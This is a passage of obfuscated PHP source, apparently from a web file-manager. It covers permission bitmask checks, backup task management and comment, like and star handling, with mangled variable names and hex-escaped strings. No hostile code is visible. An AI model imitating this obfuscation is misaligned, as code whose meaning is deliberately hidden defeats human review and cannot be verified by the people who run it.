self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($âåÖ»×–[420] => LNG($âåÖ»×–[1872]), $âåÖ»×–[1863] => $âåÖ»×–[1873], $âåÖ»×–[1865] => 4, $âåÖ»×–[1866] => 1, $âåÖ»×–[1867] => self::AUTH_SHOW | self::AUTH_VIEW), array($âåÖ»×–[420] => LNG($âåÖ»×–[1874]), $âåÖ»×–[1863] => $âåÖ»×–[1875], $âåÖ»×–[1865] => 5, $âåÖ»×–[1866] => 1, $âåÖ»×–[1867] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($âåÖ»×–[420] => LNG($âåÖ»×–[1876]), $âåÖ»×–[1863] => $âåÖ»×–[1877], $âåÖ»×–[1865] => 6, $âåÖ»×–[1866] => 1, $âåÖ»×–[1867] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($âåÖ»×–[420] => LNG($âåÖ»×–[1878]), $âåÖ»×–[1863] => $âåÖ»×–[1879], $âåÖ»×–[1865] => 7, $âåÖ»×–[1866] => 1, $âåÖ»×–[1867] => 0)); return $©åƒÃÖÔ; } public static function authCheck($À€²¬ùº, $Á”¸»İ£) { $‚¡ä¢¼ë =& $_SERVER[Îûáû“ş]; $À€²¬ùº = intval($À€²¬ùº); if ($GLOBALS[$‚¡ä¢¼ë[494]] && $GLOBALS[$‚¡ä¢¼ë[6]][$‚¡ä¢¼ë[1880]]) { return !0; } if ($À€²¬ùº <= 0) { return !1; } if (($À€²¬ùº & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($À€²¬ùº & $Á”¸»İ£); } public static function authCheckShow($’½ë‰Êë) { return self::authCheck($’½ë‰Êë, self::AUTH_SHOW); } public static function authCheckView($ì§¦„ÙÆ) { return self::authCheck($ì§¦„ÙÆ, self::AUTH_VIEW); } public static function authCheckDownload($™‰“¥ñ) { return self::authCheck($™‰“¥ñ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($æ´ìÓ) { return self::authCheck($æ´ìÓ, self::AUTH_UPLOAD); } public static function authCheckEdit($á ù™¼«) { return self::authCheck($á ù™¼«, self::AUTH_EDIT); } public static function authCheckRemove($Ÿª†Ÿå’) { return self::authCheck($Ÿª†Ÿå’, self::AUTH_REMOVE); } public static function authCheckShare($û”ğ³è) { return self::authCheck($û”ğ³è, self::AUTH_SHARE); } public static function authCheckComment($ßË¬¢ë·) { return self::authCheck($ßË¬¢ë·, self::AUTH_COMMENT); } public static function authCheckEvent($¢³Åª¯‚) { return self::authCheck($¢³Åª¯‚, self::AUTH_EVENT); } public static function authCheckRoot($Ù•ÓİÛÉ) { return self::authCheck($Ù•ÓİÛÉ, self::AUTH_ROOT); } public static function authCheckAction($ÄÊĞğ, $Œ©ıü¼ˆ) { $œ³°ªÙ€ =& $_SERVER[Îûáû“ş]; $ùÊÖ–ı = array($œ³°ªÙ€[1881] => self::AUTH_VIEW, $œ³°ªÙ€[1196] => self::AUTH_DOWNLOAD, $œ³°ªÙ€[107] => self::AUTH_UPLOAD, $œ³°ªÙ€[1831] => self::AUTH_EDIT, $œ³°ªÙ€[1830] => self::AUTH_REMOVE, $œ³°ªÙ€[1841] => self::AUTH_SHARE, $œ³°ªÙ€[354] => self::AUTH_COMMENT, $œ³°ªÙ€[1658] => self::AUTH_EVENT, $œ³°ªÙ€[1882] => self::AUTH_ROOT); if (!isset($ùÊÖ–ı[$Œ©ıü¼ˆ])) { return; } $àŞÊêû = $ùÊÖ–ı[$Œ©ıü¼ˆ]; $ÄÊĞğ = intval($ÄÊĞğ); if ($ÄÊĞğ <= 0) { return !1; } if (($ÄÊĞğ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ÄÊĞğ & $àŞÊêû); } public static function authDisable($æ¼ó Œ…, $„Æ¸¥ˆë) { if (intval($æ¼ó Œ…) <= 0) { return 0; } return intval($æ¼ó Œ…) & ~$„Æ¸¥ˆë; } public $optionType = "\123\171\163\x74\x65\155\56\163\157\x75\162\x63\x65\x41\165\164\150\x4c\x69\163\x74"; public $field = array("\x6e\x61\155\145", "\141\165\164\150", "\154\141\x62\x65\x6c", "\144\151\x73\160\x6c\x61\x79", "\163\x79\x73\164\145\x6d", "\x73\157\x72\164"); public function initData() { $“óñÉ£« = $this->authDefault(); foreach ($“óñÉ£« as $Ò·­ğÊ¾) { $this->add($Ò·­ğÊ¾); } } public function findAuth($é“®»¿, $ıŠÎÜé§) { $ûªïšìÍ =& $_SERVER[Îûáû“ş]; $ûì®ÜöØ = parent::listData(); foreach ($ûì®ÜöØ as $úşå¨) { $Áü°Ï“² = intval($úşå¨[$ûªïšìÍ[413]]); if ($Áü°Ï“² <= 0 || $úşå¨[$ûªïšìÍ[1883]] == 0) { continue; } if (($Áü°Ï“² & $é“®»¿) != $é“®»¿) { continue; } if (($Áü°Ï“² & $ıŠÎÜé§) != 0) { continue; } return $úşå¨[$ûªïšìÍ[399]]; } return !1; } public function findAuthReadOnly() { $Óêìæø = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $¦ˆ€ÑÜñ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($Óêìæø, $¦ˆ€ÑÜñ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $î€¡Àã¥ =& $_SERVER[Îûáû“ş]; $½¯ÇĞÀÁ = parent::listData(); $¨éã²ùÌ = !1; foreach ($½¯ÇĞÀÁ as $îñ°™»ó) { if ($îñ°™»ó[$î€¡Àã¥[413]] <= 0 || $îñ°™»ó[$î€¡Àã¥[1883]] == $î€¡Àã¥[198]) { continue; } if (!$¨éã²ùÌ) { $¨éã²ùÌ = $îñ°™»ó; continue; } if ($¨éã²ùÌ[$î€¡Àã¥[413]] > $îñ°™»ó[$î€¡Àã¥[413]]) { $¨éã²ùÌ = $îñ°™»ó; } } return $¨éã²ùÌ ? $¨éã²ùÌ[$î€¡Àã¥[399]] : $î€¡Àã¥[12]; } public function listData($‡«ÜÜ½‘ = false, $±Ç­Ò×¹ = "\x73\157\x72\164", $–¿²‡¥ = false) { return parent::listData($‡«ÜÜ½‘, $±Ç­Ò×¹, $–¿²‡¥); } public function update($‘°ùÍ•í, $ğúÅ©‘ ) { $—áå¤Ñæ =& $_SERVER[Îûáû“ş]; $ŒÜ€ÊÏò = parent::listData($‘°ùÍ•í); $Åêıá¢ = $this->findByName($ğúÅ©‘ [$—áå¤Ñæ[32]]); if (!$ŒÜ€ÊÏò || $Åêıá¢ && $Åêıá¢[$—áå¤Ñæ[399]] != $ŒÜ€ÊÏò[$—áå¤Ñæ[399]]) { return !1; } $this->filterAuth($ğúÅ©‘ [$—áå¤Ñæ[413]]); return parent::update($‘°ùÍ•í, $ğúÅ©‘ ); } public function remove($¢Å•ªûä) { $Ë£àØ¤ = parent::listData($¢Å•ªûä); if (!$Ë£àØ¤ || $Ë£àØ¤[$_SERVER[Îûáû“ş][1286]]) { return !1; } return parent::remove($¢Å•ªûä); } public function add($Óìšîœ‚ = array()) { $¥„À¾š =& $_SERVER[Îûáû“ş]; if ($this->findByName($Óìšîœ‚[$¥„À¾š[32]])) { return !1; } $õ¤ôåÈ¬ = array($¥„À¾š[32] => $¥„À¾š[12], $¥„À¾š[413] => 1, $¥„À¾š[1884] => $¥„À¾š[1871], $¥„À¾š[1883] => 1, $¥„À¾š[1286] => 0, $¥„À¾š[1885] => 0); $Óìšîœ‚ = array_merge($õ¤ôåÈ¬, $Óìšîœ‚); $Óìšîœ‚[$¥„À¾š[1885]] = $this->getSort(); $this->filterAuth($Óìšîœ‚[$¥„À¾š[413]]); return parent::insert($Óìšîœ‚); } private function getSort() { $Ù€îæÃÅ =& $_SERVER[Îûáû“ş]; $ĞÌñ˜Ë = parent::listData(); $Ìˆ¿’¸ = array_to_keyvalue($ĞÌñ˜Ë, $Ù€îæÃÅ[12], $Ù€îæÃÅ[1885]); return empty($Ìˆ¿’¸) ? 0 : max($Ìˆ¿’¸) + 1; } private function filterAuth(&$Õ Úø“) { if (!$Õ Úø“) { return; } $Ñ¤®§âı = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $òõêÚÒ€ = array(); foreach ($Ñ¤®§âı as $É›íµõµ) { if ($Õ Úø“ & $É›íµõµ) { $òõêÚÒ€[] = $É›íµõµ; } } if (in_array(self::AUTH_ROOT, $òõêÚÒ€)) { $Õ Úø“ = array_sum($Ñ¤®§âı); return; } $Õ•·€Í = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($òõêÚÒ€ as $É›íµõµ) { if (isset($Õ•·€Í[$É›íµõµ])) { $òõêÚÒ€ = array_merge($òõêÚÒ€, $Õ•·€Í[$É›íµõµ]); } } $òõêÚÒ€[] = self::AUTH_SHOW; $Õ Úø“ = array_sum(array_unique($òõêÚÒ€)); } public function sort($Üçƒë¨‰, $é¶“šå¤) { return parent::update($Üçƒë¨‰, $é¶“šå¤); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\56\142\141\143\x6b\165\160\114\151\163\x74"; public $field = array("\x69\157", "\x6e\141\155\145", "\163\164\141\x74\x75\x73", "\x63\x6f\x6e\164\145\156\x74", "\x6d\x61\156\x75\141\x6c", "\162\x65\x73\165\x6c\164", "\164\x69\155\x65\106\162\157\x6d", "\164\x69\x6d\145\124\x6f"); public function config() { $Õ§ÀÅ´ =& $_SERVER[Îûáû“ş]; $¾¬Êõª = Model($Õ§ÀÅ´[769])->get($Õ§ÀÅ´[779]); $¾¬Êõª = json_decode($¾¬Êõª, !0); $¾¬Êõª = is_array($¾¬Êõª) ? $¾¬Êõª : array(); if (!isset($¾¬Êõª[$Õ§ÀÅ´[753]])) { $¾¬Êõª[$Õ§ÀÅ´[753]] = $Õ§ÀÅ´[88]; } unset($¾¬Êõª[$Õ§ÀÅ´[1640]]); Action($Õ§ÀÅ´[1886])->taskInit(); Model($Õ§ÀÅ´[1639])->cacheClear(); $ïÙı¨ü¨ = $Õ§ÀÅ´[1887]; $ÏË•²ç÷ = Model($Õ§ÀÅ´[1888])->findByKey($Õ§ÀÅ´[1658], $ïÙı¨ü¨); if (!$ÏË•²ç÷) { $ÏË•²ç÷ = array(); } if (isset($ÏË•²ç÷[$Õ§ÀÅ´[180]])) { $ÏË•²ç÷[$Õ§ÀÅ´[180]] = json_decode($ÏË•²ç÷[$Õ§ÀÅ´[180]], !0); } if (isset($¾¬Êõª[$Õ§ÀÅ´[180]])) { $ÏË•²ç÷[$Õ§ÀÅ´[180]][$Õ§ÀÅ´[1643]] = $¾¬Êõª[$Õ§ÀÅ´[180]]; unset($¾¬Êõª[$Õ§ÀÅ´[180]]); } return array_merge($ÏË•²ç÷, $¾¬Êõª); } public function listData($Ïù†¤³ = false, $Ò÷»ö¬ = "\155\157\x64\151\x66\171\x54\151\155\x65", $Ç¹Åâò‚ = false) { return parent::listData($Ïù†¤³, $Ò÷»ö¬, !0); } public function lastItem() { $°Ú«ìİ = $this->listData(); return !empty($°Ú«ìİ[0]) ? $°Ú«ìİ[0] : null; } public function kill($â¢Ş¯¬œ) { $‘£€²‡ =& $_SERVER[Îûáû“ş]; $ä¼¾³–£ = $this->listData($â¢Ş¯¬œ); if (!$ä¼¾³–£ || empty($ä¼¾³–£[$‘£€²‡[32]])) { return !0; } Task::kill($‘£€²‡[778]); Task::kill($‘£€²‡[799]); Task::kill($‘£€²‡[808]); $ĞíÑ¦ÓÈ = $ä¼¾³–£[$‘£€²‡[32]]; $³Ÿ÷ÕÃŠ = TEMP_FILES . $‘£€²‡[777] . $ĞíÑ¦ÓÈ . $‘£€²‡[8]; IO::remove($³Ÿ÷ÕÃŠ, !1); return $this->remove($â¢Ş¯¬œ); } public function remove($¢ãûö´Ì) { $ÀÊÏ‡“Ğ = $this->listData($¢ãûö´Ì); if (!$ÀÊÏ‡“Ğ) { return !0; } return $this->backupRemove($ÀÊÏ‡“Ğ); } private function backupRemove($·ÌÖØ†¢) { parent::remove($·ÌÖØ†¢[$_SERVER[Îûáû“ş][399]]); $Àª¨ó† = $this->backupPath($·ÌÖØ†¢); IO::remove($Àª¨ó†, !1); return !0; } private function backupPath($«ÑÒú¦õ) { $…»Œó¾å =& $_SERVER[Îûáû“ş]; $œîôû°ş = $«ÑÒú¦õ[$…»Œó¾å[32]]; $ÉÈÌ²¥¨ = Model($…»Œó¾å[769])->get($…»Œó¾å[770]); $ø÷»°íŞ = substr(md5($…»Œó¾å[771] . $ÉÈÌ²¥¨ . $œîôû°ş), 0, 8); return "\173\x69\157\72{$«ÑÒú¦õ[$…»Œó¾å[750]]}\175\x2f\144\141\x74\x61\142\x61\x73\x65\57\142\x61\x63\x6b\x75\160\57" . $œîôû°ş . $…»Œó¾å[11] . $ø÷»°íŞ; } public function start() { $“Êà¬¿ =& $_SERVER[Îûáû“ş]; if ($GLOBALS[$“Êà¬¿[6]][$“Êà¬¿[89]][$“Êà¬¿[1889]] != $“Êà¬¿[88]) { return !0; } $¼ØğóôÔ = $this->config(); if (!$¼ØğóôÔ || $¼ØğóôÔ[$“Êà¬¿[1640]] != $“Êà¬¿[88]) { return !1; } $İ±†¶›ö = $this->process(); foreach ($İ±†¶›ö as $°£Àû¢û) { if ($°£Àû¢û) { return Task::restart($°£Àû¢û[$“Êà¬¿[399]]); } } $¤şºµÎŸ = new Backup(); $°¿æŒ—’ = $¤şºµÎŸ->db(); if ($°¿æŒ—’) { $°¿æŒ—’ = $¤şºµÎŸ->dbFile(); if ($°¿æŒ—’ && $¼ØğóôÔ[$“Êà¬¿[753]] == $“Êà¬¿[198]) { $°¿æŒ—’ = $¤şºµÎŸ->file(); } } Backup::set(array($“Êà¬¿[748] => 1, $“Êà¬¿[760] => time())); return !0; } public function process() { $â´ê¯îÈ =& $_SERVER[Îûáû“ş]; $÷œË’ó = array($â´ê¯îÈ[756] => Task::get($â´ê¯îÈ[778]), $â´ê¯îÈ[761] => Task::get($â´ê¯îÈ[799]), $â´ê¯îÈ[200] => Task::get($â´ê¯îÈ[808])); $™€‹„Š– = !1; foreach ($÷œË’ó as &$¤øŠ ¸Ú) { if ($™€‹„Š–) { $¤øŠ ¸Ú = !1; continue; } if ($¤øŠ ¸Ú) { $Ùºğå = intval(_get($¤øŠ ¸Ú, $â´ê¯îÈ[1675], 0)); if (time() - $Ùºğå > 7200) { Task::kill($¤øŠ ¸Ú[$â´ê¯îÈ[399]]); $™€‹„Š– = !0; $¤øŠ ¸Ú = !1; } } } return $÷œË’ó; } public function restore() { $·õ¼¹Ë… =& $_SERVER[Îûáû“ş]; ActionCall($·õ¼¹Ë…[1062], !0, 1); ActionCall($·õ¼¹Ë…[1062], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\155\155\145\156\x74"; protected $tableMeta = array("\x74\141\142\154\x65\x4e\141\155\x65" => "\x63\157\155\x6d\x65\x6e\164\137\155\145\164\x61", "\155\145\164\141\x46\151\145\154\144" => "\x63\x6f\155\155\145\156\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($¦Ã³îá’) { $˜ìûß ° =& $_SERVER[Îûáû“ş]; if ($¦Ã³îá’[$˜ìûß °[1890]]) { $Ô¸‹ÁË¤ = $this->where(array($˜ìûß °[1891] => $¦Ã³îá’[$˜ìûß °[1890]]))->find(); if (!$Ô¸‹ÁË¤ || $Ô¸‹ÁË¤[$˜ìûß °[411]] != $¦Ã³îá’[$˜ìûß °[411]] || $Ô¸‹ÁË¤[$˜ìûß °[496]] != $¦Ã³îá’[$˜ìûß °[496]]) { return !1; } $this->where(array($˜ìûß °[1891] => $¦Ã³îá’[$˜ìûß °[1890]]))->setAdd($˜ìûß °[1892], 1); } $¦Ã³îá’[$˜ìûß °[1893]] = 0; $¦Ã³îá’[$˜ìûß °[1892]] = 0; $¦Ã³îá’[$˜ìûß °[748]] = 1; return $this->add($¦Ã³îá’); } public function commentCount($™¹ü¢º, $—¥ôåÇ«, $ÉË¨¥Ñ = false) { $Íš½âÁ« =& $_SERVER[Îûáû“ş]; if (!$™¹ü¢º) { return array(); } if (is_string($™¹ü¢º) || is_int($™¹ü¢º)) { $™¹ü¢º = array($™¹ü¢º); } $ƒƒåöÈ = array($Íš½âÁ«[496], $Íš½âÁ«[1894] => $Íš½âÁ«[491]); $ü©ƒÀâæ = array($Íš½âÁ«[496] => array($Íš½âÁ«[7], $™¹ü¢º), $Íš½âÁ«[411] => $—¥ôåÇ«); if ($ÉË¨¥Ñ) { $ü©ƒÀâæ[$Íš½âÁ«[1670]] = $ÉË¨¥Ñ; } $À­Ê° = $this->field($ƒƒåöÈ)->where($ü©ƒÀâæ)->group($Íš½âÁ«[496])->select(); return array_to_keyvalue($À­Ê°, $Íš½âÁ«[496], $Íš½âÁ«[491]); } public function starTarget($ëÄ‹½ç , $ÏìÑÔòò) { $½©·áí¼ =& $_SERVER[Îûáû“ş]; $ÈêÄİ÷ú = $ëÄ‹½ç  + self::TYPE_STAR_OFFSET; $õô¢Çó = array($½©·áí¼[1670] => USER_ID, $½©·áí¼[411] => $ÈêÄİ÷ú, $½©·áí¼[496] => $ÏìÑÔòò); $üÑË˜ß¨ = $this->where($õô¢Çó)->find(); if ($üÑË˜ß¨) { return $this->where(array($½©·áí¼[399] => $üÑË˜ß¨[$½©·áí¼[399]]))->delete(); } $Úªñ€ = array($½©·áí¼[1890] => 0, $½©·áí¼[1670] => USER_ID, $½©·áí¼[748] => 1, $½©·áí¼[753] => $½©·áí¼[12], $½©·áí¼[411] => $ÈêÄİ÷ú, $½©·áí¼[496] => $ÏìÑÔòò, $½©·áí¼[1893] => 0, $½©·áí¼[1892] => 0); return $this->add($Úªñ€); } public function starTargetCount($ñäÛ„œã, $í¹²¸œ¯) { $“…ó»†ó =& $_SERVER[Îûáû“ş]; $­¯¥Â¬ù = $í¹²¸œ¯ + self::TYPE_STAR_OFFSET; $úÓã÷æ = $this->commentCount($ñäÛ„œã, $­¯¥Â¬ù); $áº°éşŒ = $this->commentCount($ñäÛ„œã, $­¯¥Â¬ù, USER_ID); return array($“…ó»†ó[1895] => $úÓã÷æ, $“…ó»†ó[1896] => $áº°éşŒ); } public function starTargetUserList($–ï˜ŠÇ, $¸Ô÷˜×â) { $½÷Ç•œ =& $_SERVER[Îûáû“ş]; $¾Ö¥Å•ß = $–ï˜ŠÇ + self::TYPE_STAR_OFFSET; $­ò’Ÿö– = array($½÷Ç•œ[496] => $¸Ô÷˜×â, $½÷Ç•œ[411] => $¾Ö¥Å•ß); $¥…ö…Êï = $this->where($­ò’Ÿö–)->count(); $ÃÛßŸŒÁ = array($½÷Ç•œ[255] => $¥…ö…Êï, $½÷Ç•œ[1897] => array()); if (!$¥…ö…Êï) { return $ÃÛßŸŒÁ; } $€èèÆñ = $this->field($½÷Ç•œ[1670])->where($­ò’Ÿö–)->limit(500)->select(); $€èèÆñ = array_to_keyvalue($€èèÆñ, $½÷Ç•œ[12], $½÷Ç•œ[1670]); $ÃÛßŸŒÁ[$½÷Ç•œ[1897]] = Model($½÷Ç•œ[504])->userListInfo($€èèÆñ); return $ÃÛßŸŒÁ; } public function prasiseUserList($ïÆì–¼À) { $ÅøüãÈ  =& $_SERVER[Îûáû“ş]; $½æ»Çœ = array($ÅøüãÈ [1898] => $ïÆì–¼À); $¦‹¬³‡ = $this->where($½æ»Çœ)->find(); $…œ‰—Ú = _get($¦‹¬³‡, $ÅøüãÈ [1893], 0); $ÀÑê€§ = array($ÅøüãÈ [255] => $…œ‰—Ú, $ÅøüãÈ [1897] => array()); if (!$…œ‰—Ú) { return $ÀÑê€§; } $·„Çü¾ = Model($ÅøüãÈ [1899])->field($ÅøüãÈ [1670])->where($½æ»Çœ)->limit(500)->select(); $·„Çü¾ = array_to_keyvalue($·„Çü¾, $ÅøüãÈ [12], $ÅøüãÈ [1670]); $ÀÑê€§[$ÅøüãÈ [1897]] = Model($ÅøüãÈ [504])->userListInfo($·„Çü¾); return $ÀÑê€§; } public function remove($´À€Ñ«š) { $ÓùñŠòŞ =& $_SERVER[Îûáû“ş]; $œ²Ï¿™ = array($ÓùñŠòŞ[1891] => $´À€Ñ«š); $ë¹ÎÎµ = $this->where($œ²Ï¿™)->find(); if ($ë¹ÎÎµ[$ÓùñŠòŞ[1890]]) { $this->where(array($ÓùñŠòŞ[1891] => $ë¹ÎÎµ[$ÓùñŠòŞ[1890]]))->setAdd($ÓùñŠòŞ[1892], -1); } return $this->where($œ²Ï¿™)->delete(); } public function edit($Ë×À³Î, $½ÚŒû¬Ò) { $°œ¬Ù€ =& $_SERVER[Îûáû“ş]; $ıÊ¥ç» = array($°œ¬Ù€[1891] => $Ë×À³Î); return $this->where($ıÊ¥ç»)->save(array($°œ¬Ù€[1900] => $½ÚŒû¬Ò)); } public function prasise($ë‰‚Şµ¤) { $é“Í±Ô =& $_SERVER[Îûáû“ş]; $û„ÖÆ—˜ = Model($é“Í±Ô[1901]); $Ğ´Îáö® = array($é“Í±Ô[1891] => $ë‰‚Şµ¤, $é“Í±Ô[1661] => USER_ID); $šÁº±İÌ = $û„ÖÆ—˜->where($Ğ´Îáö®)->find(); if (!$šÁº±İÌ) { $û„ÖÆ—˜->add($Ğ´Îáö®); $ƒ¿Á×ô = $this->where(array($é“Í±Ô[1891] => $ë‰‚Şµ¤))->setAdd($é“Í±Ô[1893], 1); } else { $û„ÖÆ—˜->where($Ğ´Îáö®)->delete(); $ƒ¿Á×ô = $this->where(array($é“Í±Ô[1891] => $ë‰‚Şµ¤))->setAdd($é“Í±Ô[1893], -1); } return $ƒ¿Á×ô; } public function targetInfo($ŞÌ²ğÌì, $ûÃ´şÓ) { $¸±…âÈ =& $_SERVER[Îûáû“ş]; $ƒ„ª¡æ¿ = array($¸±…âÈ[576] => $ŞÌ²ğÌì, $¸±…âÈ[577] => $ûÃ´şÓ); $çßí‹Ú = $this->where($ƒ„ª¡æ¿)->count(); $åÉ‹ä“ø = "\122\x49\x47\x48\124\x20\112\x4f\x49\116\40{$this->tablePrefix}\x63\x6f\x6d\x6d\x65\x6e\164\x5f\160\x72\141\x69\163\x65\40\x73\x74\x61\162\40\157\x6e\x20\143\157\155\155\145\x6e\x74\56\143\x6f\155\155\145\x6e\x74\111\104\x20\75\x20\163\x74\x61\162\x2e\143\x6f\x6d\155\x65\x6e\x74\111\104"; $³™™©óè = $this->alias($¸±…âÈ[354])->where($ƒ„ª¡æ¿)->join($åÉ‹ä“ø, $¸±…âÈ[1902])->count(); $ŞÑÅöÉ‡ = array($¸±…âÈ[1903] => $çßí‹Ú, $¸±…âÈ[1904] => $³™™©óè); return $ŞÑÅöÉ‡; } public function listData($È––ÙÉæ) { $›”ñãÇõ =& $_SERVER[Îûáû“ş]; if (isset($È––ÙÉæ[$›”ñãÇõ[1905]])) { if ($È––ÙÉæ[$›”ñãÇõ[1905]]) { $È––ÙÉæ[$›”ñãÇõ[1898]] = array($›”ñãÇõ[1016], intval($È––ÙÉæ[$›”ñãÇõ[1905]])); } unset($È––ÙÉæ[$›”ñãÇõ[1905]]); } if (isset($È––ÙÉæ[$›”ñãÇõ[1906]])) { if ($È––ÙÉæ[$›”ñãÇõ[1906]]) { $È––ÙÉæ[$›”ñãÇõ[1898]] = array($›”ñãÇõ[1013], intval($È––ÙÉæ[$›”ñãÇõ[1906]])); } unset($È––ÙÉæ[$›”ñãÇõ[1906]]); } return $this->_listData($È––ÙÉæ); } private function _listData($¢º”İÂ‡) { $àúß¢ûú =& $_SERVER[Îûáû“ş]; $²óÉÛŸ¡ = $this->where($¢º”İÂ‡)->_makeOrder()->selectPage(100); $this->_listAppendParent($²óÉÛŸ¡[$àúß¢ûú[369]]); $this->_listAppendUser($²óÉÛŸ¡[$àúß¢ûú[369]]); $this->_listAppendMeta($²óÉÛŸ¡[$àúß¢ûú[369]]); return $²óÉÛŸ¡; } private function _makeOrder() { $Šä¬ªªÈ =& $_SERVER[Îûáû“ş]; $êúò‡¿İ = array($Šä¬ªªÈ[1893], $Šä¬ªªÈ[1892], $Šä¬ªªÈ[201]); $ß¿¶Ãâğ = Input::get($Šä¬ªªÈ[457], $Šä¬ªªÈ[7], $Šä¬ªªÈ[423], $êúò‡¿İ); $øıÎªËÜ = Input::get($Šä¬ªªÈ[458], $Šä¬ªªÈ[7], $Šä¬ªªÈ[1663], array($Šä¬ªªÈ[1907], $Šä¬ªªÈ[453])); $ÁÔ¯´ğÂ = $ß¿¶Ãâğ . $Šä¬ªªÈ[53] . $øıÎªËÜ; return $this->order($ÁÔ¯´ğÂ); } private function _listAppendParent(&$¸ğ¤„¼€) { $â¼Å¬úÒ =& $_SERVER[Îûáû“ş]; $¹ŒíÚñ© = array_unique(array_to_keyvalue($¸ğ¤„¼€, $â¼Å¬úÒ[12], $â¼Å¬úÒ[1890])); $¹ŒíÚñ© = array_remove_value($¹ŒíÚñ©, $â¼Å¬úÒ[198]); if (!$¹ŒíÚñ©) { return; } $Áóü€± = $this->where(array($â¼Å¬úÒ[1891] => array($â¼Å¬úÒ[7], $¹ŒíÚñ©)))->select(); $Áóü€± = array_to_keyvalue($Áóü€±, $â¼Å¬úÒ[1898]); foreach ($¸ğ¤„¼€ as &$´½ôãØŠ) { if (isset($Áóü€±[$´½ôãØŠ[$â¼Å¬úÒ[1890]]])) { $´½ôãØŠ[$â¼Å¬úÒ[1908]] = $Áóü€±[$´½ôãØŠ[$â¼Å¬úÒ[1890]]]; } } unset($´½ôãØŠ); } private function _listAppendUser(&$’ù¾™½×) { $„í”¹Š‚ =& $_SERVER[Îûáû“ş]; $€Œ‚¯­œ = array_unique(array_to_keyvalue($’ù¾™½×, $„í”¹Š‚[12], $„í”¹Š‚[1670])); $€Œ‚¯­œ = array_remove_value($€Œ‚¯­œ, $„í”¹Š‚[198]); if (count($€Œ‚¯­œ) == 0) { return; } foreach ($’ù¾™½× as $ı…ä½ı£) { if (isset($ı…ä½ı£[$„í”¹Š‚[1908]])) { $€Œ‚¯­œ[] = $ı…ä½ı£[$„í”¹Š‚[1908]][$„í”¹Š‚[1670]]; } } $ºÃÊ´Ò¦ = Model($„í”¹Š‚[525])->userListInfo($€Œ‚¯­œ); foreach ($’ù¾™½× as &$ı…ä½ı£) { $ı…ä½ı£[$„í”¹Š‚[590]] = $ºÃÊ´Ò¦[$ı…ä½ı£[$„í”¹Š‚[1670]]]; if (isset($ı…ä½ı£[$„í”¹Š‚[1908]])) { $ı…ä½ı£[$„í”¹Š‚[1908]][$„í”¹Š‚[590]] = $ºÃÊ´Ò¦[$ı…ä½ı£[$„í”¹Š‚[1908]][$„í”¹Š‚[1670]]]; } } unset($ı…ä½ı£); } private function _listAppendMeta(&$íÊ¶Ïê) { $ıßğ¯¡î =& $_SERVER[Îûáû“ş]; $¶ãüœ¨Ù = array_unique(array_to_keyvalue($íÊ¶Ïê, $ıßğ¯¡î[12], $ıßğ¯¡î[1898])); $¶ãüœ¨Ù = array_remove_value($¶ãüœ¨Ù, $ıßğ¯¡î[198]); if (!$¶ãüœ¨Ù) { return; } foreach ($íÊ¶Ïê as $åÁèğÕ) { if (isset($åÁèğÕ[$ıßğ¯¡î[1908]])) { $¶ãüœ¨Ù[] = $åÁèğÕ[$ıßğ¯¡î[1908]][$ıßğ¯¡î[1898]]; } } $ìã·ß†› = $this->metaList($¶ãüœ¨Ù); if (!$ìã·ß†›) { return !1; } foreach ($íÊ¶Ïê as &$åÁèğÕ) { $åÁèğÕ[$ıßğ¯¡î[466]] = $ìã·ß†›[$åÁèğÕ[$ıßğ¯¡î[1898]]]; if (isset($åÁèğÕ[$ıßğ¯¡î[1908]])) { $åÁèğÕ[$ıßğ¯¡î[1908]][$ıßğ¯¡î[466]] = $ìã·ß†›[$åÁèğÕ[$ıßğ¯¡î[1908]][$ıßğ¯¡î[1898]]]; } } unset($åÁèğÕ); } private function metaList($Èä¬°€ù) { $ü°Îè…¥ =& $_SERVER[Îûáû“ş]; if (!$Èä¬°€ù) { return array(); } $³ÅÛëß = array($ü°Îè…¥[1898] => array($ü°Îè…¥[7], $Èä¬°€ù)); $ÅÜÂá£× = Model($ü°Îè…¥[1909])->where($³ÅÛëß)->select(); $ÅÜÂá£× = array_to_keyvalue_group($ÅÜÂá£×, $ü°Îè…¥[1898]); foreach ($ÅÜÂá£× as $»Í¢™›ù => $èù‚ŠÖÈ) { $™­—ˆ®ã = array(); foreach ($èù‚ŠÖÈ as $•¬¯ì³“) { $™­—ˆ®ã[$•¬¯ì³“[$ü°Îè…¥[94]]] = $•¬¯ì³“[$ü°Îè…¥[374]]; } $ÅÜÂá£×[$»Í¢™›ù] = $™­—ˆ®ã; } return $ÅÜÂá£× ? $ÅÜÂá£× : array(); } } goto eâ¢öœ¦À¨; b•Ú›”Ã½±: class PathDriverDbShareLink extends 